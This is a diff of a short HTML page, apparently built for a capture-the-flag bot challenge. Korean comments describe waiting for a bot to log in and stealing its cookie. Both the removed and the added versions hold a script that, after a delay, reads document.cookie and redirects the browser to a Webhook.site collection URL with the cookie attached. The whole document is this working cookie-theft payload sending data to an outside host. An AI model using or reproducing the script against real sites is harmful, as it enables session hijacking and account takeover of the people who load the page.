@@ -1,17 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        // 봇이 로그인을 완료할 때까지 기다리는 함수
-        setTimeout(() => {
-            const cookie = document.cookie;
-            // 1단계에서 복사한 Webhook.site 주소를 여기에 넣으세요!
-            const myWebhook = "https://webhook.site/99e5c1f7-0a95-42a9-ba62-8e5b77f1f215";
-            
-            // 봇의 브라우저가 훔친 쿠키를 담아서 내 Webhook 주소로 요청을 보냅니다.
-            location.href = myWebhook + "?stolen_cookie=" + encodeURIComponent(cookie);
-        }, 7000); 
-    </script>
+<script>
+    // 8~10초 정도 넉넉하게 기다린 후 쿠키를 가져옵니다.
+    setTimeout(() => {
+        const cookie = document.cookie;
+        location.href = "https://webhook.site/99e5c1f7-0a95-42a9-ba62-8e5b77f1f215" + encodeURIComponent(cookie);
+    }, 9000); 
+</script>
     <h1>Loading...</h1>
 </body>
 </html>
